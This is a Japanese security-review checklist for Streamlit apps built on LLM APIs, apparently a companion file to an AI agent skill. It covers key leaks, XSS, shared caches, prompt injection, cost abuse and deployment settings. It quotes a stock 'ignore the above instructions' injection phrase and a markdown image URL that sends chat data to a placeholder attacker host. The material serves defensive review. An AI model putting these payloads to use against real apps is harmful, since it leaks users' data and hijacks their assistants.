# チェック項目の詳細（Streamlit + LLM API アプリ）

SKILL.md の手順 3 で使う。各項目は「何を見るか → なぜ危ないか → 典型的な直し方」の順。
深刻度は「公開あり」を前提に書いてある。ローカル専用なら SKILL.md の調整ルールで下げる。

## 目次
- A. 秘密情報（APIキー）
- B. Streamlit 特有の問題
- C. LLM 特有の問題（OWASP Top 10 for LLM Applications を参考）
- D. 利用料金・乱用（コストの DoS）
- E. 一般的なコードの問題
- F. 依存ライブラリ
- G. 公開・運用の設定

---

## A. 秘密情報（APIキー）

LLM アプリの APIキーは「お金を使う権利」そのもの。漏れると第三者に使われ、請求が来る。最優先で見る。

| ID | 見るもの | 目安 |
|---|---|---|
| A1 | コード・設定・ドキュメントにキーが直書きされていないか（`AIza…` `sk-…` `sk-ant-…` など） | 重大 |
| A2 | `.env` / `.streamlit/secrets.toml` が `.gitignore` に入っているか。git 管理下に入っていないか | 高（すでにコミット済みなら重大） |
| A3 | git の過去のコミットにキーが残っていないか。残っていれば**ファイル削除では不十分で、キーの無効化・再発行が必要** | 重大 |
| A4 | `.env.example` などのひな形に本物のキーが入っていないか | 重大 |
| A5 | キーを画面に出していないか。特に **`st.text_input(value=サーバー側のキー, type="password")`**。password 型は見た目を伏せるだけで、値はブラウザへ送られる。公開すると誰でも開発者ツールで取り出せる | 公開時: 重大 / ローカル: 情報 |
| A6 | `st.write(os.environ)`、`st.write(st.secrets)`、デバッグ表示、`print`/ログへのキー出力 | 高 |
| A7 | エラー表示にキーやリクエスト内容が混ざらないか（`st.exception`、`str(e)` の表示、`client.showErrorDetails`） | 低〜中 |

A5 の直し方の例（サーバーのキーはブラウザに送らず、入力欄は「自分のキーを使いたい人」用にする）:

```python
server_key = get_default_api_key()
user_key = st.text_input("APIキー（空ならサーバー設定を使用）", type="password")
api_key = user_key.strip() or server_key
if server_key:
    st.caption("✅ サーバーに設定されたキーを使用中")
```

## B. Streamlit 特有の問題

| ID | 見るもの | なぜ | 目安 |
|---|---|---|---|
| B1 | `unsafe_allow_html=True`、`st.html`、`components.html` に **ユーザー入力や LLM の出力** が入るか | XSS（他人のブラウザで任意の JS が動く）。LLM の出力はプロンプトインジェクションで攻撃者が操作できるので「信用できない入力」扱い | 中〜高 |
| B2 | `st.cache_data` / `st.cache_resource` に利用者ごとのデータ（入力文、生成結果、利用者のAPIキーで作った client）を入れていないか | キャッシュは**全利用者で共有**。別の人に自分のデータやキーが渡る | 高 |
| B3 | モジュール直下の変数（`history = []` など）に利用者ごとのデータを入れていないか | Streamlit のサーバーは1プロセスを全員で共有。`st.session_state` を使うべき | 高 |
| B4 | `st.file_uploader` の扱い：サイズ（`server.maxUploadSize`、既定 200MB）、種類、`uploaded.name` を使った保存（パストラバーサル）、中身をそのままプロンプトへ（間接プロンプトインジェクション） | | 中 |
| B5 | `st.query_params` の値を信用していないか（権限やモードの切り替えに使っていないか） | URL は誰でも書き換えられる | 中 |
| B6 | `.streamlit/config.toml`：`server.enableXsrfProtection` / `server.enableCORS` を false にしていないか、`client.showErrorDetails`（公開時は `"none"` か `"type"` を推奨） | 既定値は安全側。無効化は理由が必要 | 低〜中 |
| B7 | 認証：公開するのに誰でも使える状態か | D の乱用に直結。Streamlit の `st.login()`（OIDC）や、公開先の閲覧制限（Community Cloud の「viewer を招待制」など）で対処できる | 公開時: 高 |

## C. LLM 特有の問題

| ID | 見るもの | なぜ | 目安 |
|---|---|---|---|
| C1 | **プロンプトインジェクション**：ユーザー入力や外部の文書（アップロード・URL 取得・検索結果）を、区切りなしで system 指示に混ぜていないか | 入力内の「以上の指示を無視して…」で振る舞いを変えられる。完全には防げないので、**被害が小さくなる設計**（権限を絞る・出力を信用しない）が本筋 | 個人用の文章生成だけなら 低 / ツール呼び出しや機密データがあれば 高 |
| C2 | **LLM の出力を危険な処理に渡していないか**：`eval`/`exec`、`subprocess`、SQL、ファイルパス、URL 取得、HTML 表示 | 出力は攻撃者が操作できる入力と同じ扱いにすべき（OWASP: Improper Output Handling） | 高〜重大 |
| C3 | **ツール呼び出し（function calling / エージェント）**の権限：ファイル削除、メール送信、DB 書き込み、任意 URL 取得などを LLM に与えていないか。実行前の人間の確認があるか | 過剰な権限（Excessive Agency） | 高 |
| C4 | system プロンプトに秘密情報（キー、社内情報、他の利用者のデータ）を入れていないか | system プロンプトは聞き出せる前提で考える | 中〜高 |
| C5 | Markdown 表示の画像・リンク：`st.markdown(LLM出力)` は HTML を無効化するので基本安全。ただし `![](https://攻撃者/?q=データ)` の画像は自動で読み込まれ、インジェクション経由で会話内容を外部へ送られうる | 機密データを扱うときだけ問題 | 低〜中 |
| C6 | 個人情報・機密を LLM プロバイダへ送っていないか。プロバイダのデータ利用規約（無料枠は学習に使われる場合がある、など）を利用者に示しているか | | 情報〜中 |
| C7 | 古い・非推奨の SDK（例: `google.generativeai` → `google-genai`）を使っていないか | 修正が出なくなる | 低 |

## D. 利用料金・乱用（コストの DoS）

公開した LLM アプリでいちばん現実に起こる被害は「知らない人にたくさん使われて請求が膨らむ」こと。

| ID | 見るもの | 目安 |
|---|---|---|
| D1 | 公開時に誰でも使えるか（B7 と同じ。ここでは料金の観点） | 公開時: 高 |
| D2 | 出力トークン上限（`max_output_tokens` / `max_tokens`）を指定しているか | 低〜中 |
| D3 | 入力の長さ制限（`st.text_area(max_chars=…)` など） | 低〜中 |
| D4 | 回数制限（`st.session_state` での回数カウント、時間あたりの上限） | 公開時: 中 |
| D5 | モデル名を自由入力できるか（高額モデルを選ばれる）。公開時は一覧から選ぶだけにする | 公開時: 中 |
| D6 | プロバイダ側で予算アラート・利用上限を設定しているか（コードからは分からないので「確認してください」と書く） | 情報 |

## E. 一般的なコードの問題

- `eval` / `exec` / `pickle.load` / `yaml.load`（SafeLoader なし）/ `subprocess(shell=True)` / `os.system`
- ユーザー入力から作る SQL（f-string 組み立て）→ プレースホルダーを使う
- ユーザーが指定した URL を取得（SSRF：サーバーから社内ネットワークやクラウドのメタデータへアクセスされる）
- ユーザー由来のファイル名で読み書き（`../` によるパストラバーサル）
- `requests` の `verify=False`（HTTPS の証明書チェック無効）

## F. 依存ライブラリ

- `requirements.txt` のバージョン指定。`>=` だけだと環境ごとに入る版が変わる。個人用なら許容、公開・チーム運用なら `pip freeze` などで固定を推奨（低）
- 既知の脆弱性の確認は `pip-audit` を使う。**入っていなければ、入れる前にユーザーに確認する**（環境に新しいものを入れるため）。
  - 例: `.\.venv\Scripts\python.exe -m pip install pip-audit` → `.\.venv\Scripts\python.exe -m pip_audit -r requirements.txt`
  - 実行しなかった場合は、レポートの「調べられなかったこと」に書く
- 実際に入っている版は `python -m pip list` で確認できる

## G. 公開・運用の設定

コードだけでは分からない項目が多い。分かる範囲で確認し、残りは「利用者が確認すること」としてレポートに書く。

- 公開先：Streamlit Community Cloud（キーは「Secrets」設定へ。リポジトリが public ならコードも丸見え）、Docker / VPS（`server.address`、HTTPS、ファイアウォール）
- `Dockerfile` に `.env` をコピーしていないか（`COPY . .` と `.dockerignore` の有無）
- 公開リポジトリかどうか（`git remote -v`）。public ならコードと履歴は全世界から読める
- LLM プロバイダの管理画面：予算アラート、キーの利用制限（API 制限・IP 制限）、使っていないキーの削除
